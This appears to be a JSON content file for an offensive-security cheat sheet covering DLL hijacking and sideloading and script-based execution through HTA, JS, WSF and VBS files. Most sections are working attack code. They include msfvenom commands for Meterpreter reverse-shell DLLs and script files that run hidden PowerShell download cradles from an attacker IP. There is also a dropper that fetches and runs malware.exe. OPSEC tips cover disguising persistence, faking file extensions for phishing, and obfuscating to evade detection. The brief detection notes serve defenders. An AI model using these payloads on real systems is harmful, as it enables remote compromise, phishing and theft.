                    ": PowerShell cmdlets for managing scheduled tasks."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "WMI Explorer",
                      "color": "blue"
                    },
                    ": GUI tool for interacting with WMI."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "OPSEC / Notes",
              "parts": [
                "OPSEC / Notes"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Use ",
                    {
                      "text": "task names that mimic legitimate system tasks",
                      "color": "yellow"
                    },
                    " (e.g., \"GoogleUpdate\", \"AdobeAAMUpdater\")."
                  ]
                },
                {
                  "parts": [
                    "For WMI, consider ",
                    {
                      "text": "temporary event subscriptions that clean up after themselves",
                      "color": "yellow"
                    },
                    " or use highly specific triggers."
                  ]
                }
              ]
            },
            {
              "type": "hr"
            },
            {
              "type": "h2",
              "text": "2.4 <span class=\"hl-blue\">DLL Hijacking</span> / <span class=\"hl-blue\">Sideloading</span>",
              "parts": [
                "2.4 ",
                {
                  "text": "DLL Hijacking",
                  "color": "blue"
                },
                " / ",
                {
                  "text": "Sideloading",
                  "color": "blue"
                }
              ]
            },
            {
              "type": "h3",
              "text": "What it is / Why it matters",
              "parts": [
                "What it is / Why it matters"
              ]
            },
            {
              "type": "p",
              "parts": [
                {
                  "text": "DLL Hijacking",
                  "color": "blue"
                },
                " and ",
                {
                  "text": "Sideloading",
                  "color": "blue"
                },
                " involve ",
                {
                  "text": "exploiting the Windows DLL search order",
                  "color": "yellow"
                },
                " or ",
                {
                  "text": "abusing legitimate applications to load malicious DLLs",
                  "color": "red"
                },
                ". This technique is ",
                {
                  "text": "very effective for persistence and privilege escalation",
                  "color": "green"
                },
                ", as the malicious code runs within the context of a trusted application."
              ]
            },
            {
              "type": "h3",
              "text": "Quick steps / Commands",
              "parts": [
                "Quick steps / Commands"
              ]
            },
            {
              "type": "h4",
              "text": "Identify Vulnerable Applications",
              "parts": [
                "Identify Vulnerable Applications"
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Use Sysinternals Process Monitor to find DLL search order issues\n# 1. Start Process Monitor (procmon.exe)\n# 2. Set filters:\n#    - Operation is \"CreateFile\"\n#    - Result is \"NAME NOT FOUND\"\n#    - Path ends with \".dll\"\n# 3. Look for applications searching for DLLs in writable directories\n#    (e.g., C:\\Program Files\\AppName\\, C:\\Program Files (x86)\\AppName\\, application installation directories)"
            },
            {
              "type": "h4",
              "text": "Generate Malicious DLL",
              "parts": [
                "Generate Malicious DLL"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Using msfvenom to generate a 64-bit Meterpreter reverse HTTPS DLL\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll\n\n# For x86 systems\nmsfvenom -p windows/meterpreter/reverse_https LHOST=10.10.14.20 LPORT=443 -f dll > hijack.dll"
            },
            {
              "type": "h4",
              "text": "Common Hijacking Scenarios",
              "parts": [
                "Common Hijacking Scenarios"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**<span class=\"hl-blue\">DLL Search Order Hijacking</span>:**",
                    " Place your malicious ",
                    {
                      "text": "`hijack.dll`",
                      "color": "blue"
                    },
                    " in a directory where a legitimate application searches for DLLs ",
                    "*before*",
                    " it finds the genuine one (e.g., the application's own directory)."
                  ]
                },
                {
                  "parts": [
                    "**<span class=\"hl-blue\">Phantom DLL Hijacking</span>:**",
                    " An application attempts to load a ",
                    {
                      "text": "missing DLL",
                      "color": "yellow"
                    },
                    ". Place your malicious DLL with that missing name in one of the directories the application searches."
                  ]
                },
                {
                  "parts": [
                    "**<span class=\"hl-blue\">DLL Side-Loading</span>:**",
                    " Replace a legitimate DLL within a signed application's directory with your malicious version. The application loads your DLL, believing it to be legitimate."
                  ]
                }
              ]
            },
            {
              "type": "code",
              "language": "cmd",
              "text": "# Example for a missing DLL scenario:\n# If an application tries to load \"C:\\Program Files\\VulnerableApp\\missing.dll\" but it doesn't exist,\n# place your malicious `missing.dll` in that specific location."
            },
            {
              "type": "h4",
              "text": "Tools for Discovery",
              "parts": [
                "Tools for Discovery"
              ]
            },
            {
              "type": "code",
              "language": "powershell",
              "text": "# PowerSploit's Find-ProcessDLLHijack module for automated analysis\nFind-ProcessDLLHijack\n\n# Manual checking with Sysinternals Procmon\nprocmon.exe -nofilter -accepteula\n# Apply filters (Process Name, Path, Result, Operation) as described above."
            },
            {
              "type": "h4",
              "text": "DLL Proxying (Maintain Functionality)",
              "parts": [
                "DLL Proxying (Maintain Functionality)"
              ]
            },
            {
              "type": "p",
              "parts": [
                "To avoid crashing the legitimate application, an attacker can create a ",
                {
                  "text": "proxy DLL",
                  "color": "blue"
                },
                " that forwards calls to the original DLL while executing malicious code."
              ]
            },
            {
              "type": "code",
              "language": "cpp",
              "text": "// Example: Forward exports to the legitimate DLL while adding malicious code\n// Requires knowledge of the original DLL's exported functions.\n// This example uses a linker directive for Visual C++.\n#pragma comment(linker, \"/export:RealFunction=hijack.RealFunction,@1\") // Forward export\n// (More complex implementations typically involve manually writing forwarders for all exports)"
            },
            {
              "type": "h3",
              "text": "What to expect",
              "parts": [
                "What to expect"
              ]
            },
            {
              "type": "p",
              "parts": [
                "When the vulnerable application runs, your ",
                {
                  "text": "malicious DLL loads with the application's privileges",
                  "color": "red"
                },
                ". This attack may ",
                {
                  "text": "require specific conditions or user actions",
                  "color": "yellow"
                },
                " to trigger the vulnerable application."
              ]
            },
            {
              "type": "h3",
              "text": "Detection / Hardening",
              "parts": [
                "Detection / Hardening"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "DLL search order hardening in applications",
                      "color": "green"
                    },
                    " (e.g., specify full paths for DLLs)."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Code signing verification",
                      "color": "green"
                    },
                    " for executables and DLLs."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Monitor for DLLs loaded from unusual locations",
                      "color": "yellow"
                    },
                    " (e.g., ",
                    {
                      "type": "inline_code",
                      "text": "AppData"
                    },
                    " directories, temporary folders)."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "EDR detection of known hijack patterns",
                      "color": "green"
                    },
                    " and suspicious DLL loads."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Protected processes (PPL)",
                      "color": "green"
                    },
                    " can make it harder to inject or sideload DLLs into critical system processes."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Tools / References",
              "parts": [
                "Tools / References"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Process Monitor",
                      "color": "blue"
                    },
                    ": Sysinternals tool for real-time file system, Registry and process activity."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "DLL Export Viewer",
                      "color": "blue"
                    },
                    ": NirSoft tool to view exported functions of a DLL."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "PowerSploit",
                      "color": "blue"
                    },
                    ": PowerShell toolkit, includes DLL hijacking modules."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Sigcheck",
                      "color": "blue"
                    },
                    ": Sysinternals tool to verify file signatures."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "OPSEC / Notes",
              "parts": [
                "OPSEC / Notes"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Test thoroughly to avoid application crashes",
                      "color": "yellow"
                    },
                    " that could alert users or administrators."
                  ]
                },
                {
                  "parts": [
                    "Consider ",
                    {
                      "text": "DLL proxying to maintain legitimate functionality",
                      "color": "yellow"
                    },
                    ", making the attack more stealthy and stable."
                  ]
                },
                {
                  "parts": [
                    "Target ",
                    {
                      "text": "applications commonly run with higher privileges",
                      "color": "yellow"
                    },
                    " for maximum impact."
                  ]
                }
              ]
            },
            {
              "type": "hr"
            },
            {
              "type": "h2",
              "text": "2.5 <span class=\"hl-blue\">HTA</span>, <span class=\"hl-blue\">JS</span> & <span class=\"hl-blue\">Other Script Executions</span>",
              "parts": [
                "2.5 ",
                {
                  "text": "HTA",
                  "color": "blue"
                },
                ", ",
                {
                  "text": "JS",
                  "color": "blue"
                },
                " & ",
                {
                  "text": "Other Script Executions",
                  "color": "blue"
                }
              ]
            },
            {
              "type": "h3",
              "text": "What it is / Why it matters",
              "parts": [
                "What it is / Why it matters"
              ]
            },
            {
              "type": "p",
              "parts": [
                "These are ",
                {
                  "text": "alternative script-based execution methods",
                  "color": "yellow"
                },
                " that can ",
                {
                  "text": "bypass application controls focused primarily on executables",
                  "color": "green"
                },
                ". They are ",
                {
                  "text": "particularly useful for phishing campaigns",
                  "color": "yellow"
                },
                " where user interaction is required to open the malicious script file."
              ]
            },
            {
              "type": "h3",
              "text": "Quick steps / Commands",
              "parts": [
                "Quick steps / Commands"
              ]
            },
            {
              "type": "h4",
              "text": "HTML Application (<span class=\"hl-blue\">HTA</span>) Files",
              "parts": [
                "HTML Application (",
                {
                  "text": "HTA",
                  "color": "blue"
                },
                ") Files"
              ]
            },
            {
              "type": "p",
              "parts": [
                "HTA files are essentially HTML files that run as trusted applications, allowing VBScript or JScript to execute with full privileges."
              ]
            },
            {
              "type": "code",
              "language": "html",
              "text": "<!-- Save as payload.hta -->\n<html>\n<head>\n<script language=\"VBScript\">\n    Set objShell = CreateObject(\"Wscript.Shell\")\n    objShell.Run \"cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", 0, True\n</script>\n</head>\n<body>\n    <h1>Document Loading... Please wait.</h1>\n</body>\n</html>\n\n<!-- Alternative HTA with immediate JScript execution -->\n<html>\n<head>\n<script language=\"JScript\">\n    new ActiveXObject(\"WScript.Shell\").Run('powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\\'http://10.10.14.20/shell.ps1\\'))\"', 0, true);\n</script>\n</head>\n<body>\n    <h1>Processing...</h1>\n</body>\n</html>"
            },
            {
              "type": "h4",
              "text": "JavaScript Download Cradle",
              "parts": [
                "JavaScript Download Cradle"
              ]
            },
            {
              "type": "p",
              "parts": [
                "A JavaScript (.js) file that downloads and executes an arbitrary payload. Can be executed with ",
                {
                  "type": "inline_code",
                  "text": "wscript.exe"
                },
                " or ",
                {
                  "type": "inline_code",
                  "text": "cscript.exe"
                },
                "."
              ]
            },
            {
              "type": "code",
              "language": "javascript",
              "text": "// Save as payload.js\nvar obj = new ActiveXObject(\"MSXML2.XMLHTTP\");\nobj.open(\"GET\", \"http://10.10.14.20/malware.exe\", false);\nobj.send();\n\nvar s = new ActiveXObject(\"ADODB.Stream\");\ns.Open();\ns.Type = 1; // adTypeBinary\ns.Write(obj.responseBody);\ns.SaveToFile(\"malware.exe\", 2); // adSaveCreateOverWrite\ns.Close();\n\nvar r = new ActiveXObject(\"WScript.Shell\").Run(\"malware.exe\");"
            },
            {
              "type": "h4",
              "text": "JScript with Embedded Payload",
              "parts": [
                "JScript with Embedded Payload"
              ]
            },
            {
              "type": "p",
              "parts": [
                "More advanced JScript that can decode and execute base64-encoded content, often shellcode."
              ]
            },
            {
              "type": "code",
              "language": "javascript",
              "text": "// Example JScript with base64 decoding (for executing embedded shellcode or scripts)\nfunction base64Decode(input) {\n    var keyStr = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";\n    var output = \"\";\n    var chr1, chr2, chr3;\n    var enc1, enc2, enc3, enc4;\n    var i = 0;\n    input = input.replace(/[^A-Za-z0-9\\+\\/\\=]/g, \"\"); // Remove invalid chars\n    while (i < input.length) {\n        enc1 = keyStr.indexOf(input.charAt(i++));\n        enc2 = keyStr.indexOf(input.charAt(i++));\n        enc3 = keyStr.indexOf(input.charAt(i++));\n        enc4 = keyStr.indexOf(input.charAt(i++));\n        chr1 = (enc1 << 2) | (enc2 >> 4);\n        chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);\n        chr3 = ((enc3 & 3) << 6) | enc4;\n        output = output + String.fromCharCode(chr1);\n        if (enc3 != 64) { output = output + String.fromCharCode(chr2); }\n        if (enc4 != 64) { output = output + String.fromCharCode(chr3); }\n    }\n    return output;\n}\n\nvar payload = \"BASE64_ENCODED_PAYLOAD_HERE\"; // Replace with your actual encoded payload\nvar decoded = base64Decode(payload);\n\n// Example: Execute decoded PowerShell command\nnew ActiveXObject(\"WScript.Shell\").Run(\"powershell -c \\\"\" + decoded + \"\\\"\");\n// For shellcode: requires more complex execution methods (e.g., memory injection)"
            },
            {
              "type": "h4",
              "text": "Windows Script File (<span class=\"hl-blue\">WSF</span>)",
              "parts": [
                "Windows Script File (",
                {
                  "text": "WSF",
                  "color": "blue"
                },
                ")"
              ]
            },
            {
              "type": "p",
              "parts": [
                "XML-based script format that supports multiple scripting languages and can be executed via ",
                {
                  "type": "inline_code",
                  "text": "wscript.exe"
                },
                " or ",
                {
                  "type": "inline_code",
                  "text": "cscript.exe"
                },
                "."
              ]
            },
            {
              "type": "code",
              "language": "xml",
              "text": "<!-- Save as payload.wsf -->\n<job id=\"Execute\">\n<script language=\"JScript\">\n    var shell = new ActiveXObject(\"WScript.Shell\");\n    shell.Run('powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\\'http://10.10.14.20/shell.ps1\\'))\"', 0, true);\n</script>\n</job>"
            },
            {
              "type": "h4",
              "text": "VBScript Files (<span class=\"hl-blue\">VBS</span>)",
              "parts": [
                "VBScript Files (",
                {
                  "text": "VBS",
                  "color": "blue"
                },
                ")"
              ]
            },
            {
              "type": "p",
              "parts": [
                "Plain VBScript files executed by ",
                {
                  "type": "inline_code",
                  "text": "wscript.exe"
                },
                " or ",
                {
                  "type": "inline_code",
                  "text": "cscript.exe"
                },
                "."
              ]
            },
            {
              "type": "code",
              "language": "vbscript",
              "text": "' Save as payload.vbs\nSet shell = CreateObject(\"Wscript.Shell\")\nshell.Run \"powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1')\", 0, True"
            },
            {
              "type": "h3",
              "text": "What to expect",
              "parts": [
                "What to expect"
              ]
            },
            {
              "type": "p",
              "parts": [
                "The ",
                {
                  "text": "script executes when the user opens the file",
                  "color": "yellow"
                },
                ", typically launching PowerShell or downloading/executing a payload. It ",
                {
                  "text": "may trigger security warnings",
                  "color": "red"
                },
                " from the operating system or antivirus."
              ]
            },
            {
              "type": "h3",
              "text": "Detection / Hardening",
              "parts": [
                "Detection / Hardening"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "Application control blocking script hosts",
                      "color": "green"
                    },
                    " like ",
                    {
                      "text": "wscript.exe",
                      "color": "blue"
                    },
                    " and ",
                    {
                      "text": "cscript.exe",
                      "color": "blue"
                    },
                    "."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Monitor for script hosts spawning PowerShell",
                      "color": "yellow"
                    },
                    ", ",
                    {
                      "type": "inline_code",
                      "text": "cmd.exe"
                    },
                    ", or other unusual child processes."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Disable Windows Script Host via GPO",
                      "color": "green"
                    },
                    " if not essential in the environment."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Email filtering for script attachments",
                      "color": "green"
                    },
                    " (",
                    {
                      "type": "inline_code",
                      "text": ".hta"
                    },
                    ", ",
                    {
                      "type": "inline_code",
                      "text": ".js"
                    },
                    ", ",
                    {
                      "type": "inline_code",
                      "text": ".vbs"
                    },
                    ", ",
                    {
                      "type": "inline_code",
                      "text": ".wsf"
                    },
                    ") and potentially macro-enabled documents."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "EDR detection of malicious script patterns",
                      "color": "green"
                    },
                    " and API calls from scripting engines."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "Tools / References",
              "parts": [
                "Tools / References"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    {
                      "text": "MSFVenom",
                      "color": "blue"
                    },
                    ": Can generate HTA payloads."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Empire",
                      "color": "blue"
                    },
                    ": A post-exploitation framework with various script-based modules."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "SET (Social Engineer Toolkit)",
                      "color": "blue"
                    },
                    ": Includes features for generating malicious HTA/JS files for phishing."
                  ]
                }
              ]
            },
            {
              "type": "h3",
              "text": "OPSEC / Notes",
              "parts": [
                "OPSEC / Notes"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Use ",
                    {
                      "text": "file extensions that match the content",
                      "color": "yellow"
                    },
                    " (e.g., embed HTA in an HTML file, or use a .doc extension for a document containing script)."
                  ]
                },
                {
                  "parts": [
                    {
                      "text": "Obfuscate script content",
                      "color": "yellow"
                    },
                    " to evade signature-based detection."
                  ]
                },
                {
                  "parts": [
                    "Consider ",
                    {
                      "text": "chaining multiple script types",
                      "color": "yellow"
                    },
                    " or stages to evade detection."
                  ]
                }
              ]
            }
          ]
        }
      ]
    }
  },
  "adminUsers": []
}